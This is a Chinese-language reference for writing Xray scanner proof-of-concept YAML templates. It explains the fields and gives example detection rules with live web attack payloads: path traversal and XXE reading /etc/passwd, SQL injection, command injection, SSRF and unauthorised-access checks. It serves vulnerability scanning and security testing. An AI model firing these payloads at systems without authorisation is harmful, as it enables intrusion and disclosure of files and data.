# Xray POC YAML 模板参考

## 基础模板结构

```yaml
name: poc-yaml-漏洞名称
transport: http
manual: true

# 变量定义（可选）
set:
  s1: randomInt(100000, 200000)
  s2: randomInt(10000, 20000)

# 规则定义
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /admin/
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: ""
      follow_redirects: true
    expression: |
      response.status == 200 && response.body_string.contains("<title>Admin</title>")

# 最终表达式
expression: |
  r0()

# 详情信息
detail:
  author: author_name
  links:
    - https://www.example.com
```

## 字段说明

### 顶层字段

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `name` | string | 是 | POC 名称，格式为 `poc-yaml-漏洞名称` |
| `transport` | string | 是 | 传输协议，可选 `http` 或 `tcp` |
| `manual` | bool | 否 | 是否手动触发，默认为 `false` |
| `set` | map | 否 | 变量定义 |
| `rules` | map | 是 | 规则定义 |
| `expression` | string | 是 | 最终匹配表达式 |
| `detail` | map | 否 | 详情信息 |

### Request 字段

| 字段 | 类型 | 说明 |
|------|------|------|
| `cache` | bool | 是否缓存请求 |
| `method` | string | HTTP 方法 (GET/POST/PUT/DELETE等) |
| `path` | string | 请求路径 |
| `headers` | map | 请求头 |
| `body` | string | 请求体 |
| `follow_redirects` | bool | 是否跟随重定向 |

## 常见漏洞类型模板

### 1. 文件读取/路径遍历

```yaml
name: poc-yaml-example-file-read
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
  r1:
    request:
      cache: true
      method: GET
      path: /download?file=..%2f..%2f..%2f..%2fc:%2fwindows%2fwin.ini
    expression: |
      response.status == 200 && response.body_string.contains("for 16-bit app support")
expression: |
  r0() || r1()
detail:
  author: author
  links:
    - https://example.com
```

### 2. SQL 注入（报错型）

```yaml
name: poc-yaml-example-sqli-error
transport: http
set:
  s1: randomInt(100000, 200000)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /search?id={{s1}}%27%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,md5({{s1}}),0x7e))%20AND%20%27a%27=%27a
    expression: |
      response.body_string.contains(substr(md5(string(s1)), 2, 28))
expression: |
  r0()
detail:
  author: author
  links:
    - https://example.com
```

### 3. SQL 注入（时间盲注）

```yaml
name: poc-yaml-example-sqli-time
transport: http
set:
  sleepSecond1: randomInt(5, 8)
  sleepSecond2: randomInt(2, 4)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /search?id=1
    expression: |
      response.status == 200
  r1:
    request:
      cache: true
      method: GET
      path: /search?id=1%20AND%20SLEEP({{sleepSecond1}})
    expression: |
      response.latency - r0latency >= sleepSecond1 * 1000
expression: |
  r0() && r1()
detail:
  author: author
  links:
    - https://example.com
```

### 4. 命令执行

```yaml
name: poc-yaml-example-rce
transport: http
set:
  s1: randomInt(100000, 200000)
  s2: randomInt(10000, 20000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /exec
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        cmd=expr%20{{s1}}%20-%20{{s2}}
    expression: |
      response.status == 200 && response.body_string.contains(string(s1 - s2))
expression: |
  r0()
detail:
  author: author
  links:
    - https://example.com
```

### 5. 反序列化漏洞

```yaml
name: poc-yaml-example-deserialization
transport: http
set:
  s1: randomInt(100000, 200000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /api/process
      headers:
        Content-Type: application/octet-stream
      body: |
        <base64_encoded_payload_with_{{s1}}>
    expression: |
      response.body_string.contains(md5(string(s1)))
expression: |
  r0()
detail:
  author: author
  links:
    - https://example.com
```

### 6. XXE 漏洞

```yaml
name: poc-yaml-example-xxe
transport: http
set:
  s1: randomInt(100000, 200000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /api/xml
      headers:
        Content-Type: application/xml
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>
    expression: |
      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: |
  r0()
detail:
  author: author
  links:
    - https://example.com
```

### 7. SSRF 漏洞

```yaml
name: poc-yaml-example-ssrf
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /fetch?url=http://127.0.0.1:22
    expression: |
      response.status == 200 && response.body_string.contains("SSH")
expression: |
  r0()
detail:
  author: author
  links:
    - https://example.com
```

### 8. 未授权访问

```yaml
name: poc-yaml-example-unauth
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /admin/config
    expression: |
      response.status == 200 && response.body_string.contains("admin") && response.body_string.contains("password")
expression: |
  r0()
detail:
  author: author
  links:
    - https://example.com
```
